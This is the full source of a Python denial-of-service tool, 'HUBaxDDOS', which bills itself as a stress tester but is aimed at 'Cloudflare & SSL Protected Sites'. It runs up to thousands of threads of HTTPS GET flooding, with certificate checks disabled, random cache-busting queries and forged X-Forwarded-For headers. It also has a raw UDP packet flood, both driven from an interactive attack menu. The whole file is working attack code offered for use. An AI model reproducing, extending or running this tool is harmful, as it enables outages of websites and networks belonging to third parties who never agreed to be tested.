#!/usr/bin/env python3
import socket
import threading
import random
import time
import ssl
from datetime import datetime
from termcolor import colored

# Maximum Performance Configuration
MAX_THREADS = 2000
PACKET_SIZE = 65507 
TIMEOUT = 2

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

class HUBaxDDOS_MAX:
    def __init__(self):
        self.attack_running = False
        self.lock = threading.Lock()
        self.stats = {'packets_sent': 0, 'start_time': None, 'target': None}
        
    def show_logo(self):
        logo = """
██╗  ██╗██╗   ██╗██████╗  █████╗ ██╗  ██╗██████╗ ██████╗  ██████╗ ███████╗
██║  ██║██║   ██║██╔══██╗██╔══██╗╚██╗██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝
███████║██║   ██║██████╔╝███████║ ╚███╔╝ ██║  ██║██║  ██║██║   ██║███████╗
██╔══██║██║   ██║██╔══██╗██╔══██║ ██╔██╗ ██║  ██║██║  ██║██║   ██║╚════██║
██║  ██║╚██████╔╝██████╔╝██║  ██║██╔╝ ██╗██████╔╝██████╔╝╚██████╔╝███████║
╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                               HUBAXDDOS
    
                                                                           
           [ MAXIMUM POWER NETWORK STRESS TEST TOOL - v2.0 ]
        """
        print(colored(logo, 'cyan', attrs=['bold']))
        print(colored("        Author: n0merc | Target: Cloudflare & SSL Protected Sites", 'white'))
        print(colored("-" * 75, 'cyan'))
        
        menu = """
    COMMANDS:
    [https] - Start MAX HTTPS/SSL Flood (for websites)
    [udp]   - Start MAX UDP Flood (for IP/Ports)
    [stats] - Show current attack statistics
    [stop]  - Terminate all active attacks
    [exit]  - Close the program
        """
        print(colored(menu, 'yellow'))
        print(colored("-" * 75, 'cyan'))

    def update_stats(self, count):
        with self.lock:
            self.stats['packets_sent'] += count

    def generate_spoof_ip(self):
        # Санамсаргүй IP хаяг үүсгэж нуух (IP Spoofing)
        return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

    def https_flood(self, url, threads=1000):
        target_host = url.replace('http://', '').replace('https://', '').split('/')[0]
        print(colored(f"\n[!] Launching MAX HTTPS Flood with IP Spoofing on {target_host}...", 'red', attrs=['bold']))
        self.attack_running = True
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        def attack():
            while self.attack_running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(TIMEOUT)
                    conn = context.wrap_socket(s, server_hostname=target_host)
                    conn.connect((target_host, 443))
                    
                    for _ in range(50): 
                        if not self.attack_running: break
                        spoofed_ip = self.generate_spoof_ip()
                        req = (f"GET /?{random.getrandbits(32)} HTTP/1.1\r\n"
                               f"Host: {target_host}\r\n"
                               f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                               f"X-Forwarded-For: {spoofed_ip}\r\n"
                               f"X-Real-IP: {spoofed_ip}\r\n"
                               f"Connection: keep-alive\r\n\r\n").encode()
                        conn.send(req)
                        self.update_stats(1)
                        print(colored(f"[*] Sent (Spoofed: {spoofed_ip}): HTTPS-GET >> {target_host}", 'cyan'))
                    conn.close()
                except: pass

        for _ in range(threads):
            threading.Thread(target=attack, daemon=True).start()

    def udp_flood(self, ip, port, threads=1000):
        print(colored(f"\n[!] Launching MAX UDP Flood on {ip}:{port}...", 'red', attrs=['bold']))
        self.attack_running = True
        payload = random._urandom(1024)

        def attack():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.attack_running:
                try:
                    sock.sendto(payload, (ip, port))
                    self.update_stats(1)
                    print(colored(f"[*] Sent: UDP-PACKET >> {ip}", 'magenta'))
                except: pass
        
        for _ in range(threads):
            threading.Thread(target=attack, daemon=True).start()

    def stop_attack(self):
        self.attack_running = False
        print(colored("\n[!] ALL ATTACKS STOPPED.", 'yellow', attrs=['bold']))

    def interactive_mode(self):
        self.show_logo()
        while True:
            try:
                cmd = input(colored("\nHUBax-MAX> ", 'white', attrs=['bold'])).strip().lower()
                if cmd == 'exit': break
                elif cmd == 'stop': self.stop_attack()
                elif cmd == 'https':
                    target = input("URL (e.g. example.com): ")
                    thr = int(input("Threads (Default 1000): ") or "1000")
                    self.https_flood(target, thr)
                elif cmd == 'udp':
                    ip = input("IP: ")
                    port = int(input("Port: "))
                    thr = int(input("Threads (Default 1000): ") or "1000")
                    self.udp_flood(ip, port, thr)
                elif cmd == 'stats':
                    print(colored(f"Total Sent: {self.stats['packets_sent']:,}", 'green'))
                elif cmd == 'help':
                    print("\nCommands: https, udp, stop, stats, exit")
                else: print("Unknown command. Type 'help'.")
            except KeyboardInterrupt: break
            except Exception as e: print(f"Error: {e}")

if __name__ == "__main__":
    HUBax_tool = HUBaxDDOS_MAX()
    HUBax_tool.interactive_mode()
